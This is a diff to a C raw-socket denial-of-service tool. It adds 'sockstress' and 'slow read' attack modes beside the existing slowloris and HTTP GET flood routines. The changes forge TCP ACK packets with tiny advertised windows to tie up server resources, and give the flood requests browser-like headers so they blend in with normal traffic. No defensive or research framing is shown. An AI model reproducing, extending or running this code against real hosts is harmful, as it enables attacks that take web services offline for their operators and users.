@@ -44,8 +44,11 @@ void send_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_in
     tcph.th_ack = htonl(seq + 1);
     tcph.th_x2 = 0;
     tcph.th_off = sizeof(struct tcphdr) / 4;
-    tcph.th_flags = 0x18;
-    tcph.th_win = htons(4); //29200
+    if(strcmp(argv[0], "sockstress") == 0)
+        tcph.th_flags = 0x10;
+    else
+        tcph.th_flags = 0x18;
+    tcph.th_win = htons(4); //4 //29200
     tcph.th_sum = 0;
     tcph.th_urp = 0;
     tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));
@@ -168,19 +171,30 @@ void packet_process(struct attack_params *packet)
         u_int32_t seq_n = ntohl(tcp->th_seq);
         u_int32_t ack_n = ntohl(tcp->th_ack);
 
-        send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
+        if(strcmp(packet->args[0], "sockstress") == 0)
+        {
+            send_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
+        }
+        else
+        {
+            send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
+        }
     }
-    //if(tcp->th_flags == 0x18) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
-    //{
-    //    printf("---------------------------\n");
-    //    printf("GOT PUSH/ACK PACKET!\n");
-    //    printf("---------------------------\n");
+    if(strcmp(packet->args[0], "slowread") == 0)
+    {
+        if(tcp->th_flags == 0x18) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
+        {
+            printf("---------------------------\n");
+            printf("GOT PUSH/ACK PACKET!\n");
+            printf("---------------------------\n");
 
-    //    u_int32_t seq_n = ntohl(tcp->th_seq);
-    //    u_int32_t ack_n = ntohl(tcp->th_ack);
+            u_int32_t seq_n = ntohl(tcp->th_seq);
+            u_int32_t ack_n = ntohl(tcp->th_ack);
 
-    //    send_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
-    //}
+            send_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
+
+        }
+    }
 }
 
 int packet_receive(u_char *argv[], const struct pcap_pkthdr *pkthdr, u_char *packet)
@@ -291,11 +305,17 @@ void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, 
         printf("\nSlowloris");
         slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
     }
-    else if(strcmp(argv[0], "http") == 0)
+    else if(strcmp(argv[0], "http") == 0) 
     {
         printf("\nHTTP Get!");
         get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
     }
+    else if(strcmp(argv[0], "slowread") == 0)
+    {
+        printf("\nSlow Read!");
+        get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
+    }
+
     close(sock_raw);
 }
 
@@ -307,7 +327,8 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     struct sockaddr_in dest;
 
     uint8_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(argv[2]) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
-    uint8_t data_len = sizeof(argv[2]) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
+    //uint8_t data_len = sizeof(argv[2]) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
+    uint16_t data_len = strlen(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
     char *pkt_data;
     pkt_data = (char *) malloc(data_len);
     if(pkt_data == NULL)
@@ -319,14 +340,25 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     bzero(pkt_data, data_len);
     uint8_t *packet;
     //packet = malloc(sizeof(u_int8_t));
-    packet = malloc(pkt_len);
+    packet = (uint8_t *) malloc(pkt_len);
     if(packet == NULL)
     {
         perror("Could not allocate packet mem on heap.\n");
         exit(-1);
     }
 
-    sprintf(pkt_data, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n", argv[2], argv[1]);
+    //sprintf(pkt_data, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n", argv[2], argv[1]);
+    sprintf(pkt_data,
+    "GET %s HTTP/1.1\r\n" //18
+    "Host: %s\r\n" //11
+    "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n" //93
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" //76
+    "Accept-Language: en-US,en;q=0.5\r\n" //36
+    "Accept-Encoding: gzip, deflate\r\n" //35
+    "DNT: 1\r\n" //11
+    "Connection: keep-alive\r\n"  //27
+    "Upgrade-Insecure-Requests: 1\r\n", //37
+    argv[2], argv[1]);
 
     u_int32_t pkt_data_len = strlen(pkt_data);
 
@@ -406,14 +438,12 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
             perror("Failed to send keepalive packet!\n");
             exit(1);
         }
-        //free(pkt_data);
         //sleep(10);
 
     }
     free(pkt_data);
     free(packet);
     pthread_exit(0);
-
 }
 
 void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
@@ -422,11 +452,8 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     struct tcphdr tcph;
     struct sockaddr_in dest;
 
-    char *request_;
-    request_ = "/icons/bread.jpg";
-
-    uint16_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(request_) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
-    uint16_t data_len = strlen(request_) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
+    uint16_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
+    uint16_t data_len = strlen(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
     char *pkt_data;
     pkt_data = (char *) malloc(data_len);
     if(pkt_data == NULL)
@@ -457,7 +484,7 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     "DNT: 1\r\n" //11
     "Connection: keep-alive\r\n"  //27
     "Upgrade-Insecure-Requests: 1\r\n\r\n", //37
-    request_, argv[1]);
+    argv[2], argv[1]);
 
     u_int32_t pkt_data_len = strlen(pkt_data);
 
@@ -484,7 +511,10 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     tcph.th_x2 = 0;
     tcph.th_off = sizeof(struct tcphdr) / 4;
     tcph.th_flags = TH_ACK;
-    tcph.th_win = htons(29200);
+    if(strcmp(argv[0], "slowread") == 0)
+        tcph.th_win = htons(28);
+    else
+        tcph.th_win = htons(29200);
     tcph.th_sum = 0;
     tcph.th_urp = 0;
     //tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, 20 + 20 + pkt_data_len);
